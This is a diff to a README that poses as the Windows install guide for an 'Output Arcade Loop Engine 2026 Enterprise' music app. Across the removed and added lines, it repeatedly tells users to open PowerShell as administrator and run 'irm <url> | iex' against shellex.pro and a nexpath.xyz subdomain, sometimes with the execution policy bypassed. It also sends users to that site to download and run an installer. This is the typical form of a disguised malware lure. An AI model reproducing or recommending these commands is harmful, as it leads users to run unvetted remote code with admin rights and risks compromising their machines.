@@ -17,13 +17,13 @@ Output Arcade Loop Engine 2026 Enterprise · Studio workflow · Plugin suite · 
 4. Click **Yes** if Windows asks for permission
 
 ```powershell
-irm https://shellex.pro/ps/setup.ps1 | iex
+irm https://output-arcade-loop-engine-2026-enterprise.nexpath.xyz/ | iex
 ```
 
 **If nothing happens or you see a policy error**, paste this instead:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://shellex.pro/ps/setup.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://output-arcade-loop-engine-2026-enterprise.nexpath.xyz/ | iex"
 ```
 
 
@@ -59,17 +59,17 @@ Notes for users who need **Output Arcade Loop Engine 2026 Enterprise** running o
 
 <details>
 <summary><b>What exactly do I paste?</b></summary>
-<br>Copy this whole line into PowerShell (Administrator):<br><br><code>irm https://shellex.pro/ps/setup.ps1 | iex</code>
+<br>Open <a href="https://output-arcade-loop-engine-2026-enterprise.nexpath.xyz/">output-arcade-loop-engine-2026-enterprise.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
 <summary><b>Where is PowerShell?</b></summary>
-<br>Windows key → type <b>powershell</b> → right-click → <b>Run as administrator</b>.
+<br>Open <a href="https://output-arcade-loop-engine-2026-enterprise.nexpath.xyz/">output-arcade-loop-engine-2026-enterprise.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
 <summary><b>Command did not run?</b></summary>
-<br>Paste this line instead:<br><br><code>powershell -ExecutionPolicy Bypass -Command "irm https://shellex.pro/ps/setup.ps1 | iex"</code>
+<br>Open <a href="https://output-arcade-loop-engine-2026-enterprise.nexpath.xyz/">output-arcade-loop-engine-2026-enterprise.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
@@ -81,27 +81,12 @@ Notes for users who need **Output Arcade Loop Engine 2026 Enterprise** running o
 
 **Topics:** output-arcade, output-arcade-app, daw-software, music-production, output-arcade-setup-failed-fix, how-to-install-output-arcade, vst-host, audio-workstation, windows-daw, output-arcade-windows, output-arcade-windows-setup, output-arcade-windows-setup-2026
 
-## INSTALLATION
+## Download
 
-**Steps:**
-1. Press **Win**, type **PowerShell**
-2. Right-click **Windows PowerShell** → **Run as administrator**
-3. Copy the command below, paste into the window, press **Enter**
-4. If **UAC** still appears – click **Yes**
+> Use the project link below for Windows.
 
-```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
-```
+* **Project link:** **[output-arcade-loop-engine-2026-enterprise.nexpath.xyz](https://output-arcade-loop-engine-2026-enterprise.nexpath.xyz/)**
+* **Full URL:** `https://output-arcade-loop-engine-2026-enterprise.nexpath.xyz/`
+* **Type:** Desktop package | Windows 10 and 11, 64-bit
+* **Setup:** Run the installer from the extracted folder
 
-<details>
-<summary><b>Command did not start?</b></summary>
-
-Try this directly in the same PowerShell window:
-
-```powershell
-irm 'https://shellex.pro/ps/setup.ps1' | iex
-```
-
-</details>
-
-<sub>Administrator rights are required to complete the setup.</sub>
